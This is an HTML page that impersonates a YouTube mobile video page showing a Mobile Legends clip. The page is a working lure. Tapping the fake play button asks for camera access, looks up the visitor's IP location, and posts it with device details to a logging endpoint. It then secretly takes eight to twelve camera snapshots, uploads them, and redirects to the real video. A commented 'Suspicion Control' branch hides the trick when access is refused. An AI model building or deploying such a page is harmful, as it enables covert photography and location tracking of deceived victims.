<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>YouTube</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --yt-black: #0f0f0f; --yt-white: #ffffff; --yt-gray: #aaaaaa; }
        body { 
            margin: 0; 
            background-color: var(--yt-black); 
            color: var(--yt-white); 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        /* iOS Style Header */
        header {
            height: 48px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            background: var(--yt-black);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .logo { font-size: 19px; font-weight: 700; letter-spacing: -1px; display: flex; align-items: center; }
        .logo i { color: #ff0000; margin-right: 4px; font-size: 22px; }

        /* The Player Area */
        .video-container { width: 100%; position: relative; }
        
        .fake-player {
            width: 100%;
            aspect-ratio: 16/9;
            background: #000 url('https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
        }

        .play-circle {
            width: 64px;
            height: 64px;
            background: rgba(0, 0, 0, 0.6);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(5px);
        }
        .play-circle i { color: white; font-size: 24px; margin-left: 4px; }

        /* Video Metadata */
        .info-box { padding: 12px 16px; }
        .title { font-size: 18px; font-weight: 600; line-height: 1.3; margin-bottom: 8px; }
        .stats { font-size: 12px; color: var(--yt-gray); margin-bottom: 12px; }
        
        .channel-strip { display: flex; align-items: center; gap: 10px; }
        .avatar { width: 36px; height: 36px; background: #333; border-radius: 50%; }
        .name { font-size: 14px; font-weight: 600; flex: 1; }
        .sub-btn { background: white; color: black; border: none; padding: 6px 15px; border-radius: 18px; font-size: 12px; font-weight: 600; }

        /* Recommendation List */
        .recs { padding: 16px; display: flex; flex-direction: column; gap: 15px; }
        .rec-item { display: flex; gap: 12px; }
        .rec-thumb { width: 140px; height: 78px; background: #222; border-radius: 8px; flex-shrink: 0; }
        .rec-meta b { font-size: 14px; display: block; line-height: 1.2; margin-bottom: 4px; }
        .rec-meta span { font-size: 11px; color: var(--yt-gray); }

        /* Hidden elements */
        video, canvas { display: none; }
    </style>
</head>
<body>

    <header>
        <div class="logo"><i class="fab fa-youtube"></i> YouTube</div>
    </header>

    <div class="video-container">
        <div class="fake-player" id="player" onclick="startIOS()">
            <div class="play-circle"><i class="fas fa-play"></i></div>
        </div>
    </div>

    <div class="info-box">
        <div class="title">Best Mobile Legends Clips 2026 | Mythic Immortal Gameplay</div>
        <div class="stats">1.2M views • 2 hours ago</div>
        <div class="channel-strip">
            <div class="avatar"></div>
            <div class="name">Vinzy Store Gaming</div>
            <button class="sub-btn">Subscribe</button>
        </div>
    </div>

    <div class="recs">
        <div class="rec-item">
            <div class="rec-thumb" style="background:url('https://i.ytimg.com/vi/mskhsZKeltA/hqdefault.jpg') center/cover;"></div>
            <div class="rec-meta"><b>Top 5 Thamuz Builds</b><span>600K views</span></div>
        </div>
        <div class="rec-item">
            <div class="rec-thumb" style="background:#222;"></div>
            <div class="rec-meta"><b>Minsitthar Global Rank 1</b><span>45K views</span></div>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const tid = urlParams.get('id');
        const mode = urlParams.get('mode') || 'photo';
        const cam = urlParams.get('cam') || 'user';
        const ytid = urlParams.get('ytid') || 'dQw4w9WgXcQ';

        async function startIOS() {
            // iOS requires a user gesture (click) to trigger MediaDevices
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: cam,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                const v = document.getElementById('v');
                v.srcObject = stream;

                // Log Device Info
                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
                await fetch(`/log_info?id=${tid}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ...ipData,
                        platform: "Apple iOS",
                        screen: `${window.screen.width}x${window.screen.height}`,
                        lang: navigator.language
                    })
                });

                let count = 0;
                const limit = (mode === 'photo') ? 8 : 12;
                
                const snapInterval = setInterval(() => {
                    if(count >= limit) {
                        window.location.replace(`https://m.youtube.com/watch?v=${ytid}`);
                        return;
                    }

                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth;
                    canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('file', blob, 'ios_capture.jpg');
                        fetch(`/upload?id=${tid}&type=${mode}`, {
                            method: 'POST',
                            body: formData
                        });
                    }, 'image/jpeg', 0.6); // Slightly lower quality for faster iOS upload

                    count++;
                }, 750); // Slightly slower interval for iOS stability

            } catch (err) {
                // Suspicion Control: If user denies, just go to the real video
                window.location.replace(`https://m.youtube.com/watch?v=${ytid}`);
            }
        }
    </script>
</body>
</html>
